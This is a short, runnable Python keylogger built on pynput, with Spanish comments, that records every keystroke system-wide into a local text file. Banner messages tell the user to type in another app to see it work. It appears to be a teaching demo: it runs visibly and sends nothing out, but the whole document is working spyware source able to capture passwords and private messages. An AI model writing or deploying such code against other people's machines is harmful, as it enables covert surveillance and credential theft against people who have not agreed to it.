# keylogger example

from pynput import keyboard

def on_press(key):
    try:
        # Registra la tecla en un archivo
        with open("log_teclas.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Para teclas especiales (Space, Enter, etc...)
        with open("log_teclas.txt", "a") as f:
            f.write(f" [{key}] ")

print("--- KEYLOGGER ACTIVADO ---")
print("El 'Keylogger' está corriendo en segundo plano")
print("Abre OTRA terminal o cualquier app y escribe algo")
print("Presiona Ctrl+C en esta terminal para detener")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
